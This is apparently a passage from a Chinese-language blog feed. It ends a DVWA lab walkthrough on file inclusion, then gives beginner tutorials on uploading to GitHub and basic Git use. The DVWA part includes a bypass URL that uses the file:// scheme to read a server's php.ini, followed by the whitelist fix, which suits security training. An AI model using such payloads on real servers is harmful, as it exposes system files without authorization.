<h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><h3 id="核心代码-2"><a href="#核心代码-2" class="headerlink" title="核心代码"></a>核心代码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; The page we wish to display</span><br><span class="line">$file &#x3D; $_GET[ &#39;page&#39; ];</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Input validation</span><br><span class="line">if( !fnmatch( &quot;file*&quot;, $file ) &amp;&amp; $file !&#x3D; &quot;include.php&quot; ) &#123;</span><br><span class="line">    &#x2F;&#x2F; This isn&#39;t the page we want!</span><br><span class="line">    echo &quot;ERROR: File not found!&quot;;</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>可以看到，High级别的代码使用了fnmatch函数检查page参数，要求page参数的开头必须是file，服务器才会去包含相应的文件。</p>
<h3 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>High级别的代码规定只能包含file开头的文件，看似安全，不幸的是我们依然可以利用file协议绕过防护策略。file协议其实我们并不陌生，当我们用浏览器打开一个本地文件时，用的就是file协议，如下图。<br>![](DVWA之File Inclusion/FI5.jpg)<br>构造url：<br><a href="http://192.168.153.130/dvwa/vulnerabilities/fi/page=file:///C:/xampp/htdocs/dvwa/php.ini" target="_blank" rel="noopener">http://192.168.153.130/dvwa/vulnerabilities/fi/page=file:///C:/xampp/htdocs/dvwa/php.ini</a></p>
<h2 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h2><h3 id="核心代码-3"><a href="#核心代码-3" class="headerlink" title="核心代码"></a>核心代码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; The page we wish to display</span><br><span class="line">$file &#x3D; $_GET[ &#39;page&#39; ];</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Only allow include.php or file&#123;1..3&#125;.php</span><br><span class="line">if( $file !&#x3D; &quot;include.php&quot; &amp;&amp; $file !&#x3D; &quot;file1.php&quot; &amp;&amp; $file !&#x3D; &quot;file2.php&quot; &amp;&amp; $file !&#x3D; &quot;file3.php&quot; ) &#123;</span><br><span class="line">    &#x2F;&#x2F; This isn&#39;t the page we want!</span><br><span class="line">    echo &quot;ERROR: File not found!&quot;;</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>可以看到，Impossible级别的代码使用了白名单机制进行防护，简单粗暴，page参数必须为“include.php”、“file1.php”、“file2.php”、“file3.php”之一，彻底杜绝了文件包含漏洞。</p>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>DVWA</tag>
        <tag>WEB</tag>
      </tags>
  </entry>
  <entry>
    <title>GitHub上传</title>
    <url>/posts/8472.html</url>
    <content><![CDATA[<h2 id="GitHub上传"><a href="#GitHub上传" class="headerlink" title="GitHub上传"></a>GitHub上传</h2><hr>
<p>0x00.首先注册github账号，登录，创建新仓库 ，点击+，点击new repository   <img src="https://i.imgur.com/Q2p1noE.png" alt>    </p>
<p>进入如下页面，填写仓库名，自己随便写一个名字，下面的描述可写可不写，点击Initialize this repository   with a README，然后创建：<a id="more"></a><br><img src="https://i.imgur.com/wNvnT5T.png" alt>   </p>
<p>0x01.下载git<br><a href="https://gitforwindows.org/" target="_blank" rel="noopener">https://gitforwindows.org/</a> </p>
<p>0x02.配置git<br>1.设置本地的ssh key，打开git bash,输入命令：<br>ssh-keygen -t rsa -C “<a href="mailto:XXXXXX@XXXX.com">XXXXXX@XXXX.com</a>“<br>其中双引号中是你注册github时用的邮箱。<br>一直回车，选择默认路径，和空密码。最后会在默认路径下生成.ssh文件夹，打开.ssh里面有两个文件，打开id_rsa.pub复制里面的密钥。</p>
<p>2.打开github,选择settings<br><img src="https://i.imgur.com/jqqfV4E.png" alt><br>得到如下页面，点击ssh and gpg keys,选择ssh keys 右边的new ssh key。出现下面绿色框的内容，填写标题，并将自己刚才复制的密钥粘贴到key中。最后点击add ssh key.<br><img src="https://i.imgur.com/PWqO1em.png" alt><br>3.查看是否成功。</p>
<p>在git bash中输入命令：ssh -T <a href="mailto:git@github.com">git@github.com</a><br>会提示，是否continue，输入yes。<br>后就会看到：</p>
<p>Warning:Permanently added ‘github.com,207.97.227.239’ (RSA) to the list of known hosts.</p>
<p>Hi zhangsiyao11! You’ve successfully authenticated, but GitHub does not provide shell access.</p>
<p>这样就成功了，不用理会warning。</p>
<p>4.克隆你刚才新建的仓库到本地<br>输入命令：<br>git clone <a href="https://github.com/zhangsiyao11/chat" target="_blank" rel="noopener">https://github.com/zhangsiyao11/chat</a><br>后面的http是你的仓库的地址。<br>此时会在刚才创建ssh  key的默认目录下生成以你仓库名为文件名的文件，打开得到下图所示：<br><img src="https://i.imgur.com/0oHqKNs.png" alt></p>
<p>6.在此处右键打开git bash,输入如下命令：<br>git init<br>git add “文件名”<br>git commit -m “文件名”<br>如果出现让你设置用户名和用户邮箱的提示，就按照提示上给的命令输入即可。后再次执行上面commit的命令。<br>git remote add origin <a href="https://github.com/zhangsiyao11/chat" target="_blank" rel="noopener">https://github.com/zhangsiyao11/chat</a><br>http为你自己仓库的地址<br>如果出现错误：<br>fatal: remote origin already exists<br>则执行以下语句：git remote rm origin<br>再执行git remote add origin <a href="https://github.com/zhangsiyao11/chat即可。" target="_blank" rel="noopener">https://github.com/zhangsiyao11/chat即可。</a><br>最后在依次执行：<br>git pull origin master<br>git push origin master<br>完成，再打开自己的仓库就会出现刚刚上传的项目文件:<br><img src="https://i.imgur.com/X0sb9Hw.png" alt></p>
]]></content>
      <categories>
        <category>Github</category>
      </categories>
      <tags>
        <tag>Github</tag>
      </tags>
  </entry>
  <entry>
    <title>Git学习（一）</title>
    <url>/posts/55269.html</url>
    <content><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>Git是目前世界上最先进的分布式版本控制系统（没有之一）。</p>
<p>以前写的代码、文档之类的东西用完之后就被我无情抛弃了，以后要用的时候又需要重新写，麻烦，所以就想到了使用Git，将自己的文档、代码托管到GitHub上。</p>
<h2 id="0x01-安装Git"><a href="#0x01-安装Git" class="headerlink" title="0x01 安装Git"></a>0x01 安装Git</h2><p>在Windows上使用Git，直接从官网上下载<a href="https://git-scm.com/downloads" target="_blank" rel="noopener" title="安装程序">安装程序</a>，然后默认选项安装即可。</p>
<p>安装完成后，鼠标右键，出现如下图，说明Git安装成功！<br><img src="/posts/55269/1.png" alt></p>
<p>安装完成后，还需要最后一步设置，鼠标右键“Git bash here”，在命令行输入：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git config --global user.name &quot;Your Name&quot;</span><br><span class="line">$ git config --global user.email &quot;Your Email&quot;</span><br></pre></td></tr></table></figure>
<p><strong>注意:</strong> git config命令的–global参数，用了这个参数，表示你这台机器上所有的Git仓库都会使用这个配置，当然也可以对某个仓库指定不同的用户名和Email地址。</p>
<h2 id="0x02-创建版本库"><a href="#0x02-创建版本库" class="headerlink" title="0x02 创建版本库"></a>0x02 创建版本库</h2><p>什么是版本库呢？版本库又名仓库，英文名repository，可以理解成一个目录，这个目录里面的所有文件都可以被Git管理起来，每个文件的创建、修改、删除，Git都能跟踪，以便任何时刻都可以追踪历史，或者在将来某个时刻可以“还原”。</p>
<p>创建一个版本库也很简单，选择一个合适的地方，创建一个空目录</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ mkdir learnGit</span><br><span class="line">$ cd learnGit</span><br></pre></td></tr></table></figure>
<p>通过<code>git init</code>命令把这个目录变成Git可以管理的仓库</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git init</span><br><span class="line">Initialized empty Git repository in F:&#x2F;PythonProject&#x2F;.git&#x2F;</span><br></pre></td></tr></table></figure>
<p>这样仓库就建好了，但是里面是空的，其实当前目录下多了一个<code>.git</code>文件夹，这个目录是Git用来跟踪管理版本库的，千万不要乱动。</p>
<p>如果没有看到.git文件夹，可能是你把它隐藏了，可以用<code>ls -la</code>查看</p>
<h2 id="0x03-三个工作区"><a href="#0x03-三个工作区" class="headerlink" title="0x03 三个工作区"></a>0x03 三个工作区</h2><ul>
<li>工作区： 指本地创建的目录，主要保存本地文件</li>
<li>暂存区： <code>git add</code>之后文件进入的地方，此时文件还没有进入版本库</li>
<li>版本库： 即仓库，<code>git commit</code>之后，文件从暂存区进入仓库</li>
</ul>
<h2 id="0x04-小试牛刀"><a href="#0x04-小试牛刀" class="headerlink" title="0x04 小试牛刀"></a>0x04 小试牛刀</h2><p>我们先编写一个<code>README.txt</code>文件，内容如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Git is a version control system.</span><br><span class="line">This is my first test for Git!</span><br></pre></td></tr></table></figure>
<p>一定要放到learngit目录下（子目录也行），因为这是一个Git仓库，放到其他地方Git找不到这个文件。</p>
<p>第一步，用<code>git add &lt;file&gt;</code>把文件添加到仓库</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git add README.txt</span><br></pre></td></tr></table></figure>
<p>执行完后没有任何回显，这就对了，Unix的哲学是“没有消息就是好消息”，说明添加成功。</p>
<p>第二步，用<code>git commit</code>提交文件到仓库</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git commit -m &quot;add a new README.txt file&quot;</span><br><span class="line">[master (root-commit) 6881823] add a new README.txt file</span><br><span class="line"> 1 file changed, 2 insertions(+)</span><br><span class="line"> create mode 100644 README.txt</span><br></pre></td></tr></table></figure>
<p><code>-m</code>后面是本次提交的说明，可以输入任何内容，也可以不输。</p>
<p><strong>说明：</strong> <code>git add</code>一次添加一个文件，<code>git commit</code>可以把多次add的文件一次性提交。</p>
<h2 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h2><p>今天主要学习如下：</p>
<p>初始化一个Git仓库，使用<code>git init</code>命令。</p>
<p>添加文件到Git仓库，分两步：</p>
<ol>
<li>使用命令git add <file>，注意，可反复多次使用，添加多个文件；</file></li>
<li>使用命令git commit -m <message>，完成。</message></li>
</ol>
<p>这里要特别强调一下，所有的版本控制系统，其实只能跟踪文本文件的改动，比如TXT文件，网页，所有的程序代码等等，Git也不例外。版本控制系统可以告诉你每次的改动，比如在第5行加了一个单词“Linux”，在第8行删了一个单词“Windows”。而图片、视频这些二进制文件，虽然也能由版本控制系统管理，但没法跟踪文件的变化，只能把二进制文件每次改动串起来，也就是只知道图片从100KB改成了120KB，但到底改了啥，版本控制系统不知道，也没法知道。</p>
<p>不幸的是，Microsoft的Word格式是二进制格式，因此，版本控制系统是没法跟踪Word文件的改动的，前面我们举的例子只是为了演示，如果要真正使用版本控制系统，就要以纯文本方式编写文件。</p>
<p>因为文本是有编码的，比如中文有常用的GBK编码，日文有Shift_JIS编码，如果没有历史遗留问题，强烈建议使用标准的UTF-8编码，所有语言使用同一种编码，既没有冲突，又被所有平台所支持。</p>
]]></content>
      <categories>
        <category>Github</category>
      </categories>
      <tags>
        <tag>Git</tag>
      </tags>
  </entry>
  <entry>
    <title>Git学习（三）</title>
    <url>/posts/19430.html</url>
    <content><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>前两天学习了<br><a href="https://www.sectime.top/posts/18335.html" target="_blank" rel="noopener">Git学习（二）</a><br><a href="https://www.sectime.top/posts/55269.html" target="_blank" rel="noopener">Git学习（一）</a></p>
<p>今天接着学习Git的管理修改、撤销修改和删除文件。</p>
<h2 id="0x01-管理修改"><a href="#0x01-管理修改" class="headerlink" title="0x01 管理修改"></a>0x01 管理修改</h2><p>Git如此优秀是因为Git跟踪管理的是修改而不是文件。</p>
<p>那么什么是修改呢？ 比如新增一行，删除一行，更改了某些字符，都是修改，创建一个文件，删除一个文件，都是修改。</p>
<p>为什么说Git管理的是修改而不是文件呢？我们接着看。</p>
<p>首先对<code>README.txt</code>进行修改，添加一行：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Git is a version control system.</span><br><span class="line">This is my first test for Git!</span><br><span class="line">Git is so good!</span><br><span class="line">Git管理的是修改</span><br></pre></td></tr></table></figure>
<p>再<code>git add</code>，</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git add README.txt</span><br><span class="line"></span><br><span class="line">$ git status</span><br><span class="line">On branch master</span><br><span class="line">Changes to be committed:</span><br><span class="line">  (use &quot;git reset HEAD &lt;file&gt;...&quot; to unstage)</span><br><span class="line"></span><br><span class="line">        modified:   README.txt</span><br></pre></td></tr></table></figure>
<p>再对<code>README.txt</code>进行修改：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ cat README.txt</span><br><span class="line">Git is a version control system.</span><br><span class="line">This is my first test for Git!</span><br><span class="line">Git is so good!</span><br><span class="line">Git管理的是修改</span><br><span class="line">test test test</span><br></pre></td></tr></table></figure>
<p>使用<code>git commit</code>提交，再查看状态</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git commit -m &quot;modify README.txt&quot;</span><br><span class="line">[master 9f9c092] modify README.txt</span><br><span class="line"> 1 file changed, 1 insertion(+)</span><br><span class="line"></span><br><span class="line">$ git status</span><br><span class="line">On branch master</span><br><span class="line">Changes not staged for commit:</span><br><span class="line">  (use &quot;git add &lt;file&gt;...&quot; to update what will be committed)</span><br><span class="line">  (use &quot;git checkout -- &lt;file&gt;...&quot; to discard changes in working directory)</span><br><span class="line"></span><br><span class="line">        modified:   README.txt</span><br><span class="line"></span><br><span class="line">no changes added to commit (use &quot;git add&quot; and&#x2F;or &quot;git commit -a&quot;)</span><br></pre></td></tr></table></figure>
<p>可以看到，我们第二次修改并没有被提交。</p>
<p>Git管理的是修改，当你用<code>git add</code>命令后，在工作区的第一次修改被放入暂存区，准备提交，但是，在工作区的第二次修改并没有放入暂存区，所以，<code>git commit</code>只负责把暂存区的修改提交了，也就是第一次的修改被提交了，第二次的修改不会被提交。</p>
<p>我们可以使用<code>git diff HEAD -- README.txt</code>查看一下工作区和版本库的区别。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git diff HEAD -- README.txt</span><br><span class="line">diff --git a&#x2F;README.txt b&#x2F;README.txt</span><br><span class="line">index f9b34f5..56dbf91 100644</span><br><span class="line">--- a&#x2F;README.txt</span><br><span class="line">+++ b&#x2F;README.txt</span><br><span class="line">@@ -2,3 +2,4 @@ Git is a version control system.</span><br><span class="line"> This is my first test for Git!</span><br><span class="line"> Git is so good!</span><br><span class="line"> Git管理的是修改</span><br><span class="line">+test test test</span><br></pre></td></tr></table></figure>
<p>可见，第二次的修改确实没有被提交。</p>
<h2 id="0x02-撤销修改"><a href="#0x02-撤销修改" class="headerlink" title="0x02 撤销修改"></a>0x02 撤销修改</h2><p>如果你在写报告的时候，不小心写错了，例如，再<code>README.txt</code>中添加一行：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ cat README.txt</span><br><span class="line">Git is a version control system.</span><br><span class="line">This is my first test for Git!</span><br><span class="line">Git is so good!</span><br><span class="line">Git管理的是修改</span><br><span class="line">test test test</span><br><span class="line">It is wrong!</span><br></pre></td></tr></table></figure>
<p>在你要准备提交的时候，你突然发现了这个错误，幸亏发现的及时</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git status</span><br><span class="line">On branch master</span><br><span class="line">Changes not staged for commit:</span><br><span class="line">  (use &quot;git add &lt;file&gt;...&quot; to update what will be committed)</span><br><span class="line">  (use &quot;git checkout -- &lt;file&gt;...&quot; to discard changes in working directory)</span><br><span class="line"></span><br><span class="line">        modified:   README.txt</span><br><span class="line"></span><br><span class="line">no changes added to commit (use &quot;git add&quot; and&#x2F;or &quot;git commit -a&quot;)</span><br></pre></td></tr></table></figure>
<p>我们可以发现，Git给了我们提示，<code>git checkout -- file</code>可以丢弃工作区的修改</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git checkout -- README.txt</span><br></pre></td></tr></table></figure>
<p>这样就可以把对<code>README.txt</code>文件在工作区的修改全部撤销，这个时候有两种情况：</p>
<p>第一种： <code>README.txt</code>在被修改后还没有被添加到暂存区，这样只要执行上面的命令就可以回到和版本库一样的状态</p>
<p>第二种： <code>README.txt</code>修改后已经被添加到暂存区，之后又做了修改，这样撤销修改就回到添加到暂存区后的状态。</p>
<p>总之，就是让这个文件回到最近一次<code>git commit</code>或<code>git add</code>时的状态。</p>
<p><code>git checkout -- file</code>命令中的<code>--</code>很重要，没有<code>--</code>，就变成了切换分支的意思。</p>
<p>假如你写错了一些东西，而且还<code>git add</code>到了暂存区，但是还没有<code>git commit</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git status</span><br><span class="line">On branch master</span><br><span class="line">Changes to be committed:</span><br><span class="line">  (use &quot;git reset HEAD &lt;file&gt;...&quot; to unstage)</span><br><span class="line"></span><br><span class="line">        modified:   README.txt</span><br></pre></td></tr></table></figure>
<p>Git告诉我们，使用<code>git reset HEAD &lt;file&gt;</code>命令可以把暂存区的修改撤销(unstage)，重新回到工作区</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git reset HEAD README.txt</span><br><span class="line">Unstaged changes after reset:</span><br><span class="line">M       README.txt</span><br></pre></td></tr></table></figure>
<p><code>git reset</code>命令既可以回退版本，也可以把暂存区的修改回退到工作区。当我们用<code>HEAD</code>时，表示最新的版本。</p>
<p>回到工作区之后，再使用上面的丢弃工作区的修改即可。</p>
<h2 id="0x03-删除文件"><a href="#0x03-删除文件" class="headerlink" title="0x03 删除文件"></a>0x03 删除文件</h2><p>在Git中，删除也是一个修改操作，我们测试一下。</p>
<p>首先添加一个<code>test.txt</code>，并提交。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git commit -m &quot;add test.txt&quot;</span><br><span class="line">[master 2a4c645] add test.txt</span><br><span class="line"> 1 file changed, 1 insertion(+)</span><br><span class="line"> create mode 100644 test.txt</span><br></pre></td></tr></table></figure>
<p>一般情况下，我们直接把工作区的文件删除即可</p>
<p>这个时候，Git知道我们删除了这个文件，这样工作区和版本库就不一样了，<code>git status</code>查看一下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git status</span><br><span class="line">On branch master</span><br><span class="line">Changes not staged for commit:</span><br><span class="line">  (use &quot;git add&#x2F;rm &lt;file&gt;...&quot; to update what will be committed)</span><br><span class="line">  (use &quot;git checkout -- &lt;file&gt;...&quot; to discard changes in working directory)</span><br><span class="line"></span><br><span class="line">        deleted:    test.txt</span><br><span class="line"></span><br><span class="line">no changes added to commit (use &quot;git add&quot; and&#x2F;or &quot;git commit -a&quot;)</span><br></pre></td></tr></table></figure>
<p>现在我们有两个选择，一是我们就是要从版本库中删除该文件，那就用<code>git rm &lt;file&gt;命令删除，然后再</code>git commit`:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git rm test.txt</span><br><span class="line">rm &#39;test.txt&#39;</span><br><span class="line"></span><br><span class="line">$ git commit -m &quot;remove test.txt&quot;</span><br><span class="line">[master b2f143d] remove test.txt</span><br><span class="line"> 1 file changed, 1 deletion(-)</span><br><span class="line"> delete mode 100644 test.txt</span><br></pre></td></tr></table></figure>
<p>这样，该文件就从版本库中删除了。</p>
<p>二是我们误删了该文件，想要恢复，怎么办呢？<br>因为版本库里还有该文件，所以我们可以轻松的把误删的文件恢复到最新版本。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git checkout -- text.txt</span><br></pre></td></tr></table></figure>
<p>git checkout其实是用版本库里的版本替换工作区的版本，无论工作区是修改还是删除，都可以“一键还原”。<br><strong>注意：</strong>从来没有被添加到版本库就被删除的文件，是无法恢复的！</p>
<h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><ol>
<li><p>Git跟踪的是修改，而不是文件，每次修改，如果没有用<code>git add</code>添加到暂存区，那就不会被<code>commit</code>到版本库中。</p>
</li>
<li><ul>
<li>①当你改乱了工作区某个文件的内容，想直接丢弃工作区的修改时，      用命令<code>git checkout -- file</code>。</li>
<li>当你不但改乱了工作区某个文件的内容，还添加到了暂存区时，想丢弃修改，分两步，第一步用命令<code>git reset HEAD &lt;file&gt;</code>，就回到了①，第二步按①操作。</li>
<li>已经提交了不合适的修改到版本库时，想要撤销本次提交，参考版本回退一节，不过前提是没有推送到远程库。</li>
</ul>
</li>
<li><p>已经提交了不合适的修改到版本库时，想要撤销本次提交，参考版本回退一节，不过前提是没有推送到远程库。</p>
</li>
</ol>
]]></content>
      <tags>
        <tag>Git</tag>
      </tags>
  </entry>
  <entry>
    <title>Git学习（二）</title>
    <url>/posts/18335.html</url>
    <content><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>昨天我们学习了如何创建版本库，如何上传文件到版本库等，今天我们来学习如何对版本库的文件进行管理，修改，删除等操作。</p>
<p><a href="https://www.sectime.top/posts/55269.html" target="_blank" rel="noopener">Git学习（一）</a></p>
<h2 id="0x01-版本回退"><a href="#0x01-版本回退" class="headerlink" title="0x01 版本回退"></a>0x01 版本回退</h2><p>我们已经成功提交README.txt文件，我们继续修改README.txt</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Git is a version control system.</span><br><span class="line">This is my first test for Git!</span><br><span class="line">hahaha</span><br></pre></td></tr></table></figure>
<p>使用<code>git status</code>查看结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git status</span><br><span class="line">On branch master</span><br><span class="line">Changes not staged for commit:</span><br><span class="line">  (use &quot;git add &lt;file&gt;...&quot; to update what will be committed)</span><br><span class="line">  (use &quot;git checkout -- &lt;file&gt;...&quot; to discard changes in working directory)</span><br><span class="line"></span><br><span class="line">        modified:   README.txt</span><br><span class="line"></span><br><span class="line">no changes added to commit (use &quot;git add&quot; and&#x2F;or &quot;git commit -a&quot;)</span><br></pre></td></tr></table></figure>
<p><code>git status</code>命令可以让我们时刻掌握仓库当前的状态，上面的命令输出告诉我们，README.txt被修改过了，但还没有被提交。</p>
<p>如果我们忘记了修改了什么地方，我们可以使用<code>git diff</code>命令查看</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git diff</span><br><span class="line">diff --git a&#x2F;README.txt b&#x2F;README.txt</span><br><span class="line">index 2237ae3..fe9c47a 100644</span><br><span class="line">--- a&#x2F;README.txt</span><br><span class="line">+++ b&#x2F;README.txt</span><br><span class="line">@@ -1,2 +1,3 @@</span><br><span class="line"> Git is a version control system.</span><br><span class="line"> This is my first test for Git!</span><br><span class="line">+hahaha</span><br><span class="line">\ No newline at end of file</span><br></pre></td></tr></table></figure>
<p>其中 <code>-</code>代表的是旧版本，<code>+</code>代表的是新版本</p>
<p>在实际生活中，我们不可能记住所有的修改，每次修改了什么，这个时候就知道版本控制的好处了。</p>
<p><code>git log</code>命令可以查看我们提交的历史记录</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git log</span><br><span class="line">commit a78dd792ca848cf12c9ce93ecec4af510a697650 (HEAD -&gt; master)</span><br><span class="line">Author: imysec &lt;1395851238@qq.com&gt;</span><br><span class="line">Date:   Thu Sep 5 17:08:43 2019 +0800</span><br><span class="line"></span><br><span class="line">    change the README.txt</span><br><span class="line"></span><br><span class="line">commit d4892a639ae1c9acbf21635e6c0d88ff35b3a94b</span><br><span class="line">Author: imysec &lt;1395851238@qq.com&gt;</span><br><span class="line">Date:   Wed Sep 4 23:19:16 2019 +0800</span><br><span class="line"></span><br><span class="line">    add a new README.txt file</span><br></pre></td></tr></table></figure>
<p><code>git log</code>显示的是从最近到最远的提交日志，也就是说，最上面的记录是最近一次提交的。</p>
<p>如果嫌输出信息太多，看得眼花缭乱的，可以试试加上<code>--pretty=oneline</code>参数：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git log --pretty&#x3D;oneline</span><br><span class="line">a78dd792ca848cf12c9ce93ecec4af510a697650 (HEAD -&gt; master) change the README.txt</span><br><span class="line">d4892a639ae1c9acbf21635e6c0d88ff35b3a94b add a new README.txt file</span><br></pre></td></tr></table></figure>
<p>现在我们要回到上一个版本，也就是“add a new README.txt file”这个版本。</p>
<p>首先，我们要知道自己当前所处的版本，在Git中，用<code>HEAD</code>表示当前版本，<code>HEAD^</code>表示上一个版本，<code>HEAD^^</code>表示上上一个版本，以此类推，第100个版本，总不能用100个<code>^</code>吧，所以我们可以用<code>HEAD~100</code>表示。</p>
<p>我们先查看<code>README.txt</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ cat README.txt</span><br><span class="line">Git is a version control system.</span><br><span class="line">This is my first test for Git!</span><br><span class="line">hahaha</span><br><span class="line">ennnnn</span><br></pre></td></tr></table></figure>
<p>现在我们用<code>git reset</code>命令回退到上一个版本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git reset --hard HEAD^</span><br><span class="line">HEAD is now at d4892a6 add a new README.txt file</span><br></pre></td></tr></table></figure>
<p>再查看<code>README.txt</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ cat README.txt</span><br><span class="line">Git is a version control system.</span><br><span class="line">This is my first test for Git!</span><br></pre></td></tr></table></figure>
<p>果然回到了上一版本。</p>
<p>再用<code>git log</code>查看日志</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git log</span><br><span class="line">commit d4892a639ae1c9acbf21635e6c0d88ff35b3a94b (HEAD -&gt; master)</span><br><span class="line">Author: imysec &lt;1395851238@qq.com&gt;</span><br><span class="line">Date:   Wed Sep 4 23:19:16 2019 +0800</span><br><span class="line"></span><br><span class="line">    add a new README.txt file</span><br></pre></td></tr></table></figure>
<p>发现第二次提交的不见了，那我们要想回到那个版本该怎么办呢？？？<br>其实还是有办法的，只要你以前使用<code>git log</code>命令的窗口没有关闭，往上翻，就可以找到以前的版本ID，再使用<code>git reset --hard ID</code>即可回到那个版本。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git reset --hard a78dd792</span><br><span class="line">HEAD is now at a78dd79 change the README.txt</span><br><span class="line"></span><br><span class="line">$ cat README.txt</span><br><span class="line">Git is a version control system.</span><br><span class="line">This is my first test for Git!</span><br><span class="line">hahaha</span><br><span class="line">ennnnn</span><br></pre></td></tr></table></figure>
<p>这里要说一点，就是版本ID没必要写全，写前面几位就够了，Git会自动匹配，but也不能太少，5,6位就行。</p>
<p>可以看到Git版本回退的速度非常快，其实在Git内部有一个<code>HEAD</code>指针，指向当前版本，当你想改变版本的时候，仅仅是移动<code>HEAD</code>指针。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">┌────┐</span><br><span class="line">│HEAD│</span><br><span class="line">└────┘</span><br><span class="line">   │           </span><br><span class="line">   └──&gt; ○ change the README.txt</span><br><span class="line">        │</span><br><span class="line">        ○ add a new README.txt file</span><br></pre></td></tr></table></figure>
<p>回到上一个版本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">┌────┐</span><br><span class="line">│HEAD│</span><br><span class="line">└────┘</span><br><span class="line">   │           </span><br><span class="line">   └──&gt; ○ change the README.txt</span><br><span class="line">        │</span><br><span class="line">        ○ add a new README.txt file</span><br></pre></td></tr></table></figure>
<p>在更改版本库的时候，也把本地工作目录也更改了。</p>
<p>但是，如果我们把<code>git log</code>的窗口关闭了，该怎么办呢？</p>
<p>稳住，别慌！</p>
<p><code>git reflog</code>可以记录你的每一次命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git reflog</span><br><span class="line">a78dd79 (HEAD -&gt; master) HEAD@&#123;0&#125;: reset: moving to a78dd792</span><br><span class="line">d4892a6 HEAD@&#123;1&#125;: reset: moving to d4892a639</span><br><span class="line">d4892a6 HEAD@&#123;2&#125;: reset: moving to HEAD^</span><br><span class="line">a78dd79 (HEAD -&gt; master) HEAD@&#123;3&#125;: commit: change the README.txt</span><br><span class="line">d4892a6 HEAD@&#123;4&#125;: commit (initial): add a new README.txt file</span><br></pre></td></tr></table></figure>
<p>即可找到commit ID。</p>
<h2 id="0x02-工作区和暂存区"><a href="#0x02-工作区和暂存区" class="headerlink" title="0x02 工作区和暂存区"></a>0x02 工作区和暂存区</h2><p>前面我们学到了，添加文件到Git版本库的时候，是分两步的</p>
<p>第一步： 用<code>git add</code>将文件添加进去，实际上是把文件修改添加到暂存区<br>第二步： 用<code>git commit</code>提交，实际上就是把暂存区的所有内容一次性提交的当前分支</p>
<p>当我们在创建版本库时，Git自动为我们创建了唯一的master分支，所以，<code>git commit</code>就是往<code>master</code>上提交更改。</p>
<p>我们现在对<code>README.txt</code>文件进行修改：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Git is a version control system.</span><br><span class="line">This is my first test for Git!</span><br><span class="line">Git is so good!</span><br></pre></td></tr></table></figure>
<p>然后再新建一个<code>LICENSE</code>文件</p>
<p>先用<code>git status</code>查看一下仓库的状态</p>
